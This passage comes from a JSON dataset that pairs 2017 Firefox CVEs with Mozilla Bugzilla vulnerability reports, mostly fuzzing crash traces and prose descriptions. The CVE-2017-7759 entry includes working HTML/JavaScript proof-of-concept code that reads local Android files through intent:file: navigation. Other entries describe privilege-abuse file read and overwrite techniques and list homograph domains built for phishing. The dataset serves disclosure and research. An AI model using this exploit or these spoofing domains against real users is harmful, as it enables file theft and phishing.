/home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:501:11 #17 0x7fa4517d8453 in _pt_root /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:216:5 #18 0x7fa45519f6d9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76d9) #19 0x7fa45422517e in clone /build/glibc-cxyGtm/glibc-2.24/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:105 AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/mfbt/Assertions.cpp:63:3 in MOZ_CrashPrintf Thread T25 (Media_Encoder) created by T0 (Web Content) here: #0 0x4a3d56 in __interceptor_pthread_create /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:245:3 #1 0x7fa4517d51f9 in _PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:457:14 #2 0x7fa4517d4e0e in PR_CreateThread /home/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:548:12 #3 0x7fa4371b7737 in nsThread::Init(nsACString const&) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:682:8 #4 0x7fa4371c1fff in nsThreadManager::NewNamedThread(nsACString const&, unsigned int, nsIThread**) /home/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:273:22 #5 0x7fa4371c4213 in NS_NewNamedThread(nsACString const&, nsIThread**, nsIRunnable*, unsigned int) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:113:45 #6 0x7fa43c0a5a2a in NS_NewNamedThread<14> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:72:10 #7 0x7fa43c0a5a2a in mozilla::dom::MediaRecorder::Session::InitEncoder(unsigned char, int) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:771 #8 0x7fa43c0a6b3f in mozilla::dom::MediaRecorder::Session::TracksAvailableCallback::NotifyTracksAvailable(mozilla::DOMMediaStream*) /home/worker/workspace/build/src/dom/media/MediaRecorder.cpp:355:17 #9 0x7fa43be42753 in mozilla::DOMMediaStream::CheckTracksAvailable() /home/worker/workspace/build/src/dom/media/DOMMediaStream.cpp:1287:19 #10 0x7fa43be5f112 in applyImpl<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1084:12 #11 0x7fa43be5f112 in apply<mozilla::DOMMediaStream, void (mozilla::DOMMediaStream::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1090 #12 0x7fa43be5f112 in mozilla::detail::RunnableMethodImpl<mozilla::DOMMediaStream*, void (mozilla::DOMMediaStream::*)(), true, (mozilla::RunnableKind)0>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1133 #13 0x7fa4371bd02e in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1321:14 #14 0x7fa4371c8db8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:472:10 #15 0x7fa437f6d461 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #16 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #17 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #18 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #19 0x7fa43d37b80f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #20 0x7fa440c0eea7 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #21 0x7fa437ecae00 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #22 0x7fa437ecae00 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #23 0x7fa437ecae00 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #24 0x7fa440c0e909 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #25 0x4eb7a3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #26 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285 #27 0x7fa45413d3f0 in __libc_start_main /build/glibc-cxyGtm/glibc-2.24/csu/../csu/libc-start.c:291 ==23790==ABORTING"
      }
    ],
    "CVE-2017-7759": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356893",
        "title": "Firefox for Android allows navigating from http: to file: URLs",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20170323105023 Firefox for Android Steps to reproduce: Visit an remote (http) webpage: <script> location=\"intent:file:///(path)#Intent;type=text/html;end\"; </script> Actual results: The JS code above redirects the user to file: URL. The redirection allows remote pages to exfiltrate files in /sdcard/Download/. Here is a PoC that steals \"secret\" file in Download directory: <body style=font-size:300%> <h1>remote_attack.html</h1> <p>Downloading local_attack.html.</p> <a id=a0 href=\"data:text/html,<body style=font-size:300%> <h1>local_attack.html</h1> <p>Reading /sdcard/Download/secret.</p> <script> var xhr=new XMLHttpRequest(); xhr.open('GET', 'secret', true); xhr.onreadystatechange = function() { if (xhr.readyState == 4) alert(xhr.responseText) }; xhr.send(); </script>\" download=\"local_attack.html\"> <script> // Attacker first downloads his attack page (local_attack.html) to sdcard a0.click(); // Then navigates to the file with file scheme. // (The file path below might need adjustment depending on the device) setTimeout(function() { location=\"intent:file:///storage/emulated/0/Download/local_attack.html#Intent;type=text/html;end\"; }, 2000); </script> I confirmed the code works in Firefox for android v52.0.2 (Nexus 5x). Expected results: Navigation from http/https URLs to file URLs should be blocked."
      }
    ],
    "CVE-2017-7762": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1358248",
        "title": "Address bar spoof in reader mode",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 Steps to reproduce: 1. Go to about:reader?url=https%3A%2F%2Ftest.shhnjk.com%2Fcsp_read.php Actual results: address before @ is shown in address bar which could be used for phishing. Expected results: user information (left side of @) in url should not be shown in address bar. This is incomplete fix of https://www.mozilla.org/en-US/security/advisories/mfsa2017-10/#﷒0﷓"
      }
    ],
    "CVE-2017-7763": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1360309",
        "title": "Security issue: Domain spoofing thanks to U+0F8C rendered as space on Mac",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 Steps to reproduce: The character U+0F8C (TIBETAN SIGN INVERTED MCHU CAN) when used in a domain name in Firefox on Mac looks just like a space. This can be abused to spoof a legitimate domain followed by a chain of the character, e.g. \"accounts.google.com<U+0F8C x 52>.bntk.pl\". I have created a domain https://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/ which is SSL-enabled and looks just like important-domain.google.com when your Firefox window is now wide enough to cover the whole address. The DNS limits makes it impossible to add arbitrary number of U+0F8C chars in the address bar. As a workaround, the attacker might add just a dot, hoping that the end-user will not notice it, for example: http://important-domain.google.xn--com-lumaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xn--cfdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/. I have attached a screenshot of a SSL-enabled domain using 53 U+0F8C characters."
      }
    ],
    "CVE-2017-7764": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1364283",
        "title": "Security: disallow \"Canadian Syllabics\" unicode block from IDN domains",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36 Steps to reproduce: VULNERABILITY DETAILS Firefox should prevent the “Canadian Syllabics” unicode block from rendering in domain names with characters from other unicode blocks. This was observed in data found in the Certificate Transparency log while seeking to quantify the IDN impersonation/phishing problem (raw data attached). REPRODUCTION CASE There are a series of characters in the “CANADIAN SYLLABICS” unicode block which can be used to impersonate other domains. I believe mixing this block with other unicode blocks should be disallowed and the punycode value should be displayed. The characters within this set that I believe could be abused: http://www.fileformat.info/info/unicode/block/unified_canadian_aboriginal_syllabics/list.htm (I do not know the registration status of any of the domains below) http://xn--youtue-084a.com/ -- youtuᖯe.com -- example domain http://xn--youtbe-z72a.com/ -- youtᑌbe.com -- example domain http://xn--uny-8wq.com/ -- ᑭuny.com -- example domain http://xn--oor-hxq.com -- ᑯoor.com -- example domain http://xn--ego-73q.com/ -- ᒪego.com -- example domain http://xn--fc-lym.com/ -- fcᒿ.com -- example domain is not fc2.com (alexa top 1m #97) -- this is likely the hardest to see (based on the fonts I’m using) http://xn--ulu-7sr.com/ -- ᕼulu.com -- example domain http://invalid.xn--acebook-yp9a.com/ -- ᖴacebook.com -- example domain Tested with Firefox Nightly 55.0a1 (2017-05-11) (32-bit) This issue has also been reported to chromium Actual results: unicode domains are displayed when mixing the “CANADIAN SYLLABICS” unicode block with other unicode characters. Expected results: Punycode values should have been displayed when mixing the “CANADIAN SYLLABICS” unicode block with other unicode characters. ---- background ---- (please excuse the length of this report) To form the attached lists, I cross referenced the Google CT Pilot log and the Alexa top 1 million domains (only .com domains). There are a fair number of false positives (non-abusive domain impersonations or python unidecode failures), but I choose not to manually remove them. ---- Other unicode characters observed ---- ĸ, 22, 0x138, \"LATIN SMALL LETTER KRA\" 96074858, 1509667199, xn--faceboo-jhb.com, facebooĸ.com , ĸ, facebook.com, 3, 1 86142753, 1507679999, xn--autodes-jhb.com, autodesĸ.com , ĸ, autodesk.com, 697, 1 ł, 5, 0x142, \"LATIN SMALL LETTER L WITH STROKE\" 94011919, 1524055021, xn--ppe-8ka60c.com, àppłe.com , àł, apple.com, 69, 1 94724468, 1500291180, xn--sack-01a.com, słack.com , ł, slack.com, 205, 1 ı, 100, 0x131, \"LATIN SMALL LETTER DOTLESS I\" 18331655, 1488327078, xn--reddt-q4a.com, reddıt.com , ı, reddit.com, 7, 1 95900673, 1500493680, xn--t-fka.com, tı.com , ı, ti.com, 3235, 1 84518766, 1497998760, xn--gml-kua34j.com, gmȧıl.com , ȧı, gmail.com, 22463, 1 95900424, 1500493860, xn--fat-jua.com, fıat.com , ı, fiat.com, 54102, 1 94504694, 1509148799, xn--curacao-egamng-hgc.com, curacao-egamıng.com , ı, curacao-egaming.com, 524456, 1 94724500, 1500493920, xn--suzu-kza.com, ısuzu.com , ı, isuzu.com, 866480, 1 ì, 25, 0xec, \"LATIN SMALL LETTER I WITH GRAVE\" 95900680, 1500670920, xn--twttr-7raz.com, twìttèr.com , ìè, twitter.com, 11, 1 85019386, 1507161599, xn--polonex-3ya.com, polonìex.com , ì, poloniex.com, 1595, 1 83724035, 1497798600, xn--gma-pma40b.com, gmaìĺ.com , ìĺ, gmail.com, 22463, 1 ---- Special case observed --- 2 interesting domains observed bypasses Chromium checks by using only cyrillic characters: 07022746, 1443571199, xn--80aac5cct.com, таобао.com , таобао, taobao.com, 10, 1 10303999, 1461542399, xn--e1anr4f.com, тіме.com , тіме, time.com, 817, 1"
      }
    ],
    "CVE-2017-7765": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1273265",
        "title": "Firefox Mark of the Web bypass (MSVR 1533)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586 Steps to reproduce: Dan from Microsoft Vulnerability Research (MSVR) here. We’ve found a way to bypass Mark of the Web in FireFox. I have a repro available at the following URL: http://payloadhoster.cloudapp.net/85231FFExploit.htm (the same file is attached, but would need to be hosted somewhere along with a file to download in order to repro the issue) To reproduce the issue: 1. On a Windows 10 machine with Office installed, browse to the page in Firefox 2. Click the link 3. Select either to save the file locally, or open in PowerPoint This vulnerability appears to be caused by links with a “download” attribute that causes the filename to be longer than what’s allowed in Windows. It’s likely that the cause here is trying to call one Windows API or another with a string that’s too long. Thank you for reviewing this report and we'll pass on any questions from the engineering team to the finder promptly. We look forward to hearing your team's analysis. For our prompt attention, please email msvr@microsoft.com and reference MSVR 1533 in the title. Actual results: mark of the web is not applied in either case Expected results: mark of the web is applied and the file is open in protected view"
      }
    ],
    "CVE-2017-7767": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336964",
        "title": "Arbitrary file \"deletion\" as SYSTEM with maintenance service",
        "description": "An unprivileged (standard) user can use the maintenance service to overwrite arbitrary files with junk data. There is no control over what is written to the target file, though the absence of the original data effectively \"deletes\" it. For example, running the poc with clobber_file.rb \"C:\\Program Files (x86)\\Mozilla Firefox\\updater.exe\" will lock firefox to the current installed version until an administrator repairs the installation because the existing updater.exe cannot be loaded to be verified. The root cause seems to be that if GetTempFileNameW in WriteStatusFailure [0] is called with a path like '\\\\.\\c:\\foo\\clobbered', instead of returning a temporary file like '\\\\.\\c:\\foo\\clobbered\\svc123.tmp', it just returns the input path. WriteStatusFailure then directly writes to the temporary path [1], truncating it's contents with the results of the updater. WriteStatusFailure can be called with a user-supplied directory in a few places, the easiest way is to put the target in the first argument and not supply enough further arguments to cause GetInstallationDir in ExecuteServiceCommand to fail [2]. This is how the attached clobber_file.rb proof of concept works. I haven't tested, but I think the calls in UpdaterIsValid would also be able to be purposely failed with an attacker controlled directory for update.status to get written into. Possibly some of the calls after that point as well, but it gets more difficult once the updater directory is verified as legitimate. I also tested using hardlinks to redirect the update.status file while using a normal file path to trigger the overwrite - this does not seem to be possible as the maintenance service re-creates the file (which deletes the hardlink, rather than the file that is points to). Tested on Windows 8.1 x64, Firefox 51.0.1 as well as mozilla-central. [0] - https://dxr.mozilla.org/mozilla-central/rev/1d025ac534a6333a8170a59a95a8a3673d4028ee/toolkit/mozapps/update/common/updatehelper.cpp#276 [1] - https://dxr.mozilla.org/mozilla-central/rev/1d025ac534a6333a8170a59a95a8a3673d4028ee/toolkit/mozapps/update/common/updatehelper.cpp#288 [2] - https://dxr.mozilla.org/mozilla-central/rev/1d025ac534a6333a8170a59a95a8a3673d4028ee/toolkit/components/maintenanceservice/workmonitor.cpp#601"
      }
    ],
    "CVE-2017-7768": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336979",
        "title": "32 byte arbitrary file reads as SYSTEM with maintenance service",
        "description": "An unprivileged (standard) user can use the maintenance service to read the first 32 bytes of any file as the _SYSTEM user. Which isn't amazing, but still better than nothing :) For example, running the poc with arbitrary_read.rb \"C:\\Users\\Seb\\creds.txt\" will return the first 32 bytes of the first line in the shell. The full 32 bytes of multiline files can be seen in the C:\\Program Files (x86)\\Mozilla Maintenance Service\\logs\\maintenanceservice.log file. The root cause is that we can trick the maintenance service into reading an arbitrary file in IsStatusApplying [0] by providing a hardlinked update.status where it expects one from the updater.exe. Even though the updater.exe runs, it seems to do so in such a way that it doesn't remove/update the update.status that we have prepared. When the maintenance service goes to read the update.status from the updater, instead it reads the hardlinked file as _SYSTEM. It then writes this to the maintenanceservice.log file [1], which is world-readable. The buffer is only 32 bytes long, so that's all we get out of the file. If all 32 bytes are read, the buf string isn't null terminated so the memory past the end of the buffer is logged as well (until it hits a null byte). The proof of concept is a little bit rushed sorry - although you can create a hardlinked file as an unprivileged user, I've been having trouble deleting them without elevating. Either elevating and removing the hardlink before rerunning the poc, or using a different directory should fix that. The CreateHardlink binary is a compiled version from https://github.com/google/symboliclink-testing-tools/tree/master/CreateHardlink. Tested on Windows 8.1 x64, Firefox 51.0.1 as well as mozilla-central. [0] - https://dxr.mozilla.org/mozilla-central/rev/1d025ac534a6333a8170a59a95a8a3673d4028ee/toolkit/components/maintenanceservice/workmonitor.cpp#69 [1] - https://dxr.mozilla.org/mozilla-central/rev/1d025ac534a6333a8170a59a95a8a3673d4028ee/toolkit/components/maintenanceservice/workmonitor.cpp#74"
      }
    ],
    "CVE-2017-7770": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1317242",
        "title": "Location Bar Spoofing Risk using the Fullscreen mode and a new tab loaded using the alert()",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:49.0) Gecko/20100101 Firefox/49.0 Build ID: 20161019084923 Steps to reproduce: Steps to reproduce: When you go on the fullscreen mode and you load after a new tab with the alert(); , the location bar has disappeared. 1 : Go on http://www.alternativ-testing.fr/Research/Mozilla/android/-K8H4D0-Location_Bar_Spoofing-FullScreen-and-alert-JavaScript-Function/TESTCASE1.HTML and click on the first link (this will activated Fullscreen Mode). 2 : Click on the second link , a new tab will be openned which contains a webpage which load the JavaScript alert(); Function. Actual results: Actual results: Now the location bar is invisible (even if you try to press the back button on android , the location bar has disappeared for always) you ca use now a fake location bar (leading to a Location Bar Spoofing) Expected results: After all these steps, you can use a fake location bar (leading to a Location Bar Spoofing)."
      }
    ],
    "CVE-2017-7778": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1358551",
        "title": "Graphite2: use of uninitialized memory [@ graphite2::GlyphCache::Loader::read_glyph]",
        "description": "Found while fuzzing graphite commit 0646e4e The attached test cases triggers multiple instances of uninitialized memory usage. See attached log for full report. To reproduce: valgrind -q --track-origins=yes ./gr2fonttest test_case.ttf Conditional jump or move depends on uninitialised value(s) at 0x4130AB: sparse<(anonymous namespace)::_glat_iterator<unsigned short> > (Sparse.h:107) by 0x4130AB: GlyphFace<(anonymous namespace)::_glat_iterator<unsigned short> > (GlyphFace.h:74) by 0x4130AB: graphite2::GlyphCache::Loader::read_glyph(unsigned short, graphite2::GlyphFace&, int*) const (GlyphCache.cpp:423) by 0x411FD7: graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) (GlyphCache.cpp:142) by 0x40C7D1: graphite2::Face::readGlyphs(unsigned int) (Face.cpp:98) by 0x407A67: load_face (gr_face.cpp:54) by 0x407A67: gr_make_face_with_ops (gr_face.cpp:89) by 0x4089B8: gr_make_file_face (gr_face.cpp:242) by 0x405111: Parameters::testFileFont() const (gr2FontTest.cpp:639) by 0x406286: main (gr2FontTest.cpp:802) Uninitialised value was created by a heap allocation at 0x4C2DBB6: malloc (vg_replace_malloc.c:299) by 0x40DBB8: gralloc<unsigned char> (Main.h:88) by 0x40DBB8: graphite2::Face::Table::decompress() (Face.cpp:333) by 0x40D85A: graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) (Face.cpp:292) by 0x414575: graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) (GlyphCache.cpp:270) by 0x411A9F: graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) (GlyphCache.cpp:118) by 0x40C7D1: graphite2::Face::readGlyphs(unsigned int) (Face.cpp:98) by 0x407A67: load_face (gr_face.cpp:54) by 0x407A67: gr_make_face_with_ops (gr_face.cpp:89) by 0x4089B8: gr_make_file_face (gr_face.cpp:242) by 0x405111: Parameters::testFileFont() const (gr2FontTest.cpp:639) by 0x406286: main (gr2FontTest.cpp:802)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356607",
        "title": "Graphite2: heap-buffer-overflow read [@ graphite2::Silf::getClassGlyph]",
        "description": "Found in graphite git revision 8afc7d00. STR: With an ASan build run: ./g2fonttest test_case.ttf -auto -demand ==21704==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000000c6 at pc 0x0000005702c7 bp 0x7ffefba26fd0 sp 0x7ffefba26fc8 READ of size 2 at 0x60d0000000c6 thread T0 #0 0x5702c6 in graphite2::Silf::getClassGlyph(unsigned short, unsigned int) const src/Silf.cpp:349:17 #1 0x5f2253 in graphite2::Segment::getClassGlyph(unsigned short, unsigned short) const src/inc/Segment.h:128:76 #2 0x5f2253 in (anonymous namespace)::put_glyph_8bit_obs(unsigned char const*&, int*&, int*, regbank&) src/inc/opcodes.h:226 #3 0x5ee2f4 in graphite2::vm::Machine::run(void* const*, unsigned char const*, graphite2::Slot**&) src/call_machine.cpp:121:12 #4 0x5eb4a9 in graphite2::vm::Machine::Code::run(graphite2::vm::Machine&, graphite2::Slot**&) const src/Code.cpp:746:15 #5 0x5d567f in graphite2::Pass::doAction(graphite2::vm::Machine::Code const*, graphite2::Slot*&, graphite2::vm::Machine&) const src/Pass.cpp:682:26 #6 0x5cf59b in graphite2::Pass::findNDoRule(graphite2::Slot*&, graphite2::vm::Machine&, graphite2::FiniteStateMachine&) const src/Pass.cpp:548:33 #7 0x5cda88 in graphite2::Pass::runGraphite(graphite2::vm::Machine&, graphite2::FiniteStateMachine&, bool) const src/Pass.cpp:417:13 #8 0x571411 in graphite2::Silf::runGraphite(graphite2::Segment*, unsigned char, unsigned char, int) const src/Silf.cpp:429:33 #9 0x533dea in graphite2::Face::runGraphite(graphite2::Segment*, graphite2::Silf const*) const src/Face.cpp:180:23 #10 0x527695 in graphite2::Segment::runGraphite() src/inc/Segment.h:97:53 #11 0x524b62 in (anonymous namespace)::makeAndInitialize(graphite2::Font const*, graphite2::Face const*, unsigned int, graphite2::FeatureVal const*, gr_encform, void const*, unsigned long, int) src/gr_segment.cpp:46:73 #12 0x524b62 in gr_make_seg src/gr_segment.cpp:105 #13 0x51aaea in Parameters::testFileFont() const gr2fonttest/gr2FontTest.cpp #14 0x51c809 in main gr2fonttest/gr2FontTest.cpp:798:20 #15 0x7f778a1a482f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #16 0x41d498 in _start (gr2fonttest+0x41d498)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1355182",
        "title": "Graphite2: Assertion 'size() > n' failed [@ graphite2::FeatureRef::applyValToFeature]",
        "description": "Found with a 32bit build running gr2FontTest. STR: Run in gdb with a 32-bit debug build. gdb --args ./g2fonttest test_case.ttf -auto -demand -noprint gr2fonttest: src/inc/List.h:81: reference graphite2::Vector<unsigned int>::operator[](size_t) [T = unsigned int]: Assertion `size() > n' failed. Program received signal SIGABRT, Aborted. 0xf7fd7c89 in __kernel_vsyscall () (gdb) bt #0 0xf7fd7c89 in __kernel_vsyscall () #1 0xf7cafea9 in __GI_raise (sig=6) at ../sysdeps/unix/sysv/linux/raise.c:54 #2 0xf7cb1407 in __GI_abort () at abort.c:89 #3 0xf7ca8d07 in __assert_fail_base ( fmt=0xf7de3088 \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n%n\", assertion=0x808c3a8 \"size() > n\", file=0x808b89b \"src/inc/List.h\", line=81, function=0x808c3b3 \"reference graphite2::Vector<unsigned int>::operator[](size_t) [T = unsigned int]\") at assert.c:92 #4 0xf7ca8d8b in __GI___assert_fail (assertion=0x808c3a8 \"size() > n\", file=0x808b89b \"src/inc/List.h\", line=81, function=0x808c3b3 \"reference graphite2::Vector<unsigned int>::operator[](size_t) [T = unsigned int]\") at assert.c:101 #5 0x080572af in graphite2::Vector<unsigned int>::operator[] (n=<optimized out>, this=<optimized out>) at src/inc/List.h:81 #6 graphite2::FeatureRef::applyValToFeature (this=<optimized out>, val=3888, pDest=...) at src/FeatureMap.cpp:279 #7 0x08056eea in graphite2::FeatureMap::readFeats (this=<optimized out>, face=...) at src/FeatureMap.cpp:178 #8 0x08057371 in graphite2::SillMap::readFace (this=0x80abd04, face=...) at src/FeatureMap.cpp:191 #9 0x08055330 in graphite2::Face::readFeatures (this=0x80abd00) at src/Face.cpp:161 #10 0x0804f251 in (anonymous namespace)::load_face (face=..., options=<optimized out>) at src/gr_face.cpp:59 #11 gr_make_face_with_ops (appFaceHandle=<optimized out>, ops=<optimized out>, faceOptions=<optimized out>) at src/gr_face.cpp:89 #12 0x080502c2 in gr_make_file_face (filename=<optimized out>, faceOptions=0) at src/gr_face.cpp:242 #13 0x0804c6eb in Parameters::testFileFont (this=0xffffcf28) at gr2fonttest/gr2FontTest.cpp:639 #14 0x0804d9ed in main (argc=<optimized out>, argv=<optimized out>) at gr2fonttest/gr2FontTest.cpp:798"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1355174",
        "title": "Graphite2: out of bounds read [@ graphite2::Silf::readGraphite]",
        "description": "Found with a 32bit build running gr2FontTest. STR: Run in gdb with a 32-bit debug build. gdb --args ./g2fonttest test_case.ttf -auto -demand -noprint Program received signal SIGSEGV, Segmentation fault. be::_peek<4> (p=<optimized out>) at src/inc/Endian.h:50 50 return _peek<S/2>(p) << (S/2)*8 | _peek<S/2>(p+S/2); (gdb) bt #0 be::_peek<4> (p=<optimized out>) at src/inc/Endian.h:50 #1 be::read<unsigned int> (p=<optimized out>) at src/inc/Endian.h:60 #2 graphite2::Silf::readGraphite (this=<optimized out>, silf_start=<optimized out>, lSilf=<optimized out>, face=..., version=<optimized out>) at src/Silf.cpp:188 #3 0x080551d8 in graphite2::Face::readGraphite (this=<optimized out>, silf=...) at src/Face.cpp:149 #4 0x0804f27e in (anonymous namespace)::load_face (face=..., options=<optimized out>) at src/gr_face.cpp:59 #5 gr_make_face_with_ops (appFaceHandle=<optimized out>, ops=<optimized out>, faceOptions=<optimized out>) at src/gr_face.cpp:89 #6 0x080502c2 in gr_make_file_face (filename=<optimized out>, faceOptions=4294967292) at src/gr_face.cpp:242 #7 0x0804c6eb in Parameters::testFileFont (this=0xffffcf08) at gr2fonttest/gr2FontTest.cpp:639 #8 0x0804d9ed in main (argc=<optimized out>, argv=<optimized out>) at gr2fonttest/gr2FontTest.cpp:798"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1352747",
        "title": "Graphite2 heap-buffer-overflow write [@ lz4::decompress] src/Decompressor.cpp:90",
        "description": "Found in 28cc60d with a 32 bit build. To reproduce run: ./gr2fonttest -auto -demand test_case.ttf ==5957==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf5203f84 at pc 0x081acfc2 bp 0xff9a3948 sp 0xff9a393c WRITE of size 4 at 0xf5203f84 thread T0 #0 0x81acfc1 in void (anonymous namespace)::unaligned_copy<4>(void*, void const*) src/inc/Compression.h:55:3 #1 0x81acfc1 in (anonymous namespace)::overrun_copy(unsigned char*, unsigned char const*, unsigned int) src/inc/Compression.h:75 #2 0x81acfc1 in lz4::decompress(void const*, unsigned int, void*, unsigned int) src/Decompressor.cpp:90 #3 0x814e6ac in graphite2::Face::Table::decompress() src/Face.cpp:339:20 #4 0x814dd32 in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) src/Face.cpp:292:9 #5 0x8140540 in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) src/gr_face.cpp:49:21 #6 0x8141aba in gr_make_face_with_ops src/gr_face.cpp:89:16 #7 0x8141aba in gr_make_file_face src/gr_face.cpp:242 #8 0x813b99e in Parameters::testFileFont() const gr2fonttest/gr2FontTest.cpp:639:20 #9 0x813d9d3 in main gr2fonttest/gr2FontTest.cpp:798:9 #10 0xf75bc636 in __libc_start_main /build/glibc-5sb1ri/glibc-2.23/csu/../csu/libc-start.c:291 #11 0x805fe47 in _start (/home/user/workspace/graphite2/gr2fonttest+0x805fe47) 0xf5203f84 is located 0 bytes to the right of 1796-byte region [0xf5203880,0xf5203f84) allocated by thread T0 here: #0 0x8104184 in __interceptor_malloc (/home/user/workspace/graphite2/gr2fonttest+0x8104184) #1 0x814e5f2 in unsigned char* graphite2::gralloc<unsigned char>(unsigned int) src/inc/Main.h:88:28 #2 0x814e5f2 in graphite2::Face::Table::decompress() src/Face.cpp:333 #3 0x814dd32 in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) src/Face.cpp:292:9 #4 0x8140540 in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) src/gr_face.cpp:49:21 #5 0x8141aba in gr_make_face_with_ops src/gr_face.cpp:89:16 #6 0x8141aba in gr_make_file_face src/gr_face.cpp:242 #7 0x813b99e in Parameters::testFileFont() const gr2fonttest/gr2FontTest.cpp:639:20 #8 0x813d9d3 in main gr2fonttest/gr2FontTest.cpp:798:9 #9 0xf75bc636 in __libc_start_main /build/glibc-5sb1ri/glibc-2.23/csu/../csu/libc-start.c:291"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1352745",
        "title": "Graphite2 heap-buffer-overflow write [@ lz4::decompress]",
